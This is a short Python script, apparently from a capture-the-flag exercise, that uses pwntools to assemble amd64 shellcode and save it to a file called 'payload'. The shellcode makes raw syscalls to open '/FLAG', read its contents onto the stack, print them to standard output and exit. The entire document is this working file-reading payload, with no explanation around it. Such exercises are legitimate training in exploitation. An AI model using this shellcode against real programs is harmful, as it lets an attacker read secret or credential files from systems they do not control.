from pwn import *

context.arch = 'amd64'

sc = asm('''
    /* open("/FLAG", 0) */
    mov rax, 2
    lea rdi, [rip + path]
    xor rsi, rsi
    syscall

    /* read(fd, rsp, 100) */
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 100
    xor rax, rax
    syscall

    /* write(1, rsp, 100) */
    mov rdi, 1
    mov rax, 1
    syscall

    /* exit(0) */
    mov rax, 60
    xor rdi, rdi
    syscall

path:
    .ascii "/FLAG\\0"
''')

with open("payload", "wb") as f:
    f.write(sc)

